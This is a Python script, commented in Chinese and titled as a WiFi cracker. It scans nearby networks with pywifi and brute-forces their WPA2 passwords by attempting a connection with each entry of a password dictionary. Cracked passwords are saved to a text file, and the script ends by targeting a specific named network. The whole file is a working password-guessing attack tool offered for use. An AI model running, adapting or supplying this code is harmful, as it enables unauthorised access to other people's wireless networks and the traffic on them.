'''
wifi 破解器
分三步走
一： 扫描附近WiFi
二： 选择指定WiFi并破解
三： 连接到指定WiFi
'''
from pywifi import *
import time


class WiFI:
    #初始化
    def __init__(self, path):
        self.path = path                                 #获取字典文件路径
        wifi = PyWiFi()                                  #创建无线对象
        self.iface = wifi.interfaces()[0]                #获取当前机器第一个无线网卡
        self.Check_state()
        self.scan_wifi()

    #判断当前WiFi连接状态
    def Check_state(self):
        '''

        :return: self.iface_state: 当前网关状态
        '''
        state_list = ['未连接网络', '正在扫描', '闲置', '正在连接', '已连接']
        self.iface_state = state_list[self.iface.status()]
        print('当前网关状态为:', self.iface_state)
        return self.iface_state

    #扫描附近WiFi
    #这里有个中文名称乱码问题
    #想要输出中文名称的话
    #需要 encode('raw_unicode_escape', 'strict').decode()
    def scan_wifi(self, scantime = 5):
        '''
        :param scantime:int   指定扫描时间， 默认5秒
        :return:self.SSID_list, self.BSSID_list,
                self.AKM_list, self.signal_list            #返回名字，mac地址，加密方式，信号强度列表
        '''
        #数据准备
        AKM = ['AKM_TYPE_NONE',
                'AKM_TYPE_WPA',
                'AKM_TYPE_WPAPSK',
                'AKM_TYPE_WPA2',
                'AKM_TYPE_WPA2PSK']

        #数据结构准备
        self.SSID_list = ['网络名字']
        self.BSSID_list = ['MAC地址']
        self.AKM_list = ['加密类型']
        self.signal_list = ['信号强度']

        #逻辑
        self.iface.scan()                     #扫描附近WiFi
        time.sleep(scantime)
        wifi_sources = self.iface.scan_results()

        for wifi_info in wifi_sources:
            name = wifi_info.ssid.encode(encoding='raw_unicode_escape', errors='strict').decode()
            if name !='' and wifi_info.bssid not in self.BSSID_list:
                self.SSID_list.append(name)
                self.BSSID_list.append(wifi_info.bssid)
                self.AKM_list.append(AKM[wifi_info.akm[0]])
                if wifi_info.signal > -55:
                    self.signal_list.append('强')
                elif wifi_info.signal > -73:
                    self.signal_list.append('中')
                else:
                    self.signal_list.append('弱')

        # print(self.SSID_list)
        # print(self.BSSID_list)
        # print(self.AKM_list)
        # print(self.signal_list)

        return self.SSID_list, self.BSSID_list, self.AKM_list, self.signal_list

    #连接到指定WiFi
    def connect_wifi(self, wifi_ssid, password):
        '''
        :param wifi_ssid: string           WiFi名字
        :param password: string            密码
        :return: self.iface_state: string  连接状态
        '''
        profile = Profile()                                 #配置文件
        profile.ssid = wifi_ssid                            #WiFi名称
        profile.auth = const.AUTH_ALG_OPEN                  #认证算法 - 公开
        profile.akm.append(const.AKM_TYPE_WPA2PSK)          #加密类型
        profile.cipher = const.CIPHER_TYPE_CCMP             #加密单元
        profile.key = password                              #WiFi密码

        self.iface.remove_all_network_profiles()            #先清空其他配置
        tmp_profile = self.iface.add_network_profile(profile)             #加载配置

        #print('开始连接 %s'%wifi_ssid)
        self.iface.connect(tmp_profile)                     #开始连接
        time.sleep(5)

        if self.iface.status() == const.IFACE_CONNECTED:    #判断是否连接上
            isOK = True
            print('正确密码：' + password)
        else:
            isOK = False
            print('密码错误：' + password)

        self.iface.disconnect()                             #断开
        time.sleep(1)
        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        return isOK

    #主要逻辑
    #对所有WiFi源逐个用字典爆破
    def run_all(self):
        self.pw_dic = {}
        for wifi_ssid in self.SSID_list[1:]:
            print()
            print('--------------------------------------------')
            print('现在正在爆破的wifi为： ' + wifi_ssid)
            self.file = open(self.path, 'r', errors='ignore')
            while True:
                try:
                    password = self.file.readline().strip()
                    if password == '':
                        self.res = wifi_ssid + ' 爆破失败：字典中没有该wifi的密码'
                        print(self.res)
                        break
                    self.bool = self.connect_wifi(wifi_ssid, password)
                    if self.bool:
                        self.res = wifi_ssid + ' 爆破成功！密码为：'+ password
                        self.pw_dic[wifi_ssid] = password
                        print(self.res)
                        break
                except:
                    continue
        print()
        print('爆破结束')
        if self.pw_dic:
            print('成功爆破的网络为')
            for name, pwd in self.pw_dic.items():
                print(name + '----------->' + pwd)
        else:
            print('没有成功爆破的网络...')
        return self.pw_dic

    def run_one(self, wifi_ssid):
        self.pw_dic = {}
        print()
        print('--------------------------------------------')
        print('现在正在爆破的wifi为： ' + wifi_ssid)
        self.file = open(self.path, 'r', errors='ignore')
        while True:
            try:
                password = self.file.readline().strip()
                if password == '':
                    self.res = wifi_ssid + ' 爆破失败：字典中没有该wifi的密码'
                    print(self.res)
                    break
                self.bool = self.connect_wifi(wifi_ssid, password)
                if self.bool:
                    self.res = wifi_ssid + ' 爆破成功！密码为：'+ password
                    self.pw_dic[wifi_ssid] = password
                    save_password_to_file(self.pw_dic)
                    print(self.res)
                    break
            except:
                continue
        print()
        print('爆破结束')
        return self.pw_dic

#将爆破结果记录下来
def save_password_to_file(dic):
    with open('password.txt', 'a') as file:
        for name,pwd in dic.items():
            file.write(name + '----------->' + pwd)





path = 'dict/birthday'
wifi = WiFI(path)
wifi.run_one('wangxl')
